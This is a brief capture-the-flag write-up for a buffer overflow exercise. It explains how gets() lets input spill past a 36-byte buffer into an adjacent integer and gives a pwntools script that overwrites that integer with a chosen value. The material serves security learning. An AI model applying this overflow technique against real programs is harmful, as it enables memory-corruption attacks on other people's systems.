# 1_bof

`1_bof` is similar to `0_bof` in that it uses `gets` and we need to change a variable to solve this.

Except in this challenge, we change an `int` variable rather than a `char`.

In the source code we can see that `arr` is given 36 bytes and vuln being initialised right next to it. So as we learned in `0_bof`, we need to overflow the 36 byte buffer and then we will gain the ability to write into `vuln`.

The output of the program indicated that it wants the integer `4660` as hex but backwards.

So, to give the raw bytes `0x4321` we use the `pack` function from `pwntools`.

<details>
  <summary>My solution</summary>

```py
from pwn import *

#context.log_level = "debug"
remote_conn = False

IP = ""
PORT = ""
FILENAME = "./1_bof"

if remote_conn:
    p = remote(IP, PORT)
    elf = ELF(FILENAME)
else:
    p = process(FILENAME)
    elf = p.elf

payload = b"A"*36 + pack(0x4321)
p.sendlineafter("backwards?", payload)

p.interactive()
```

</details>
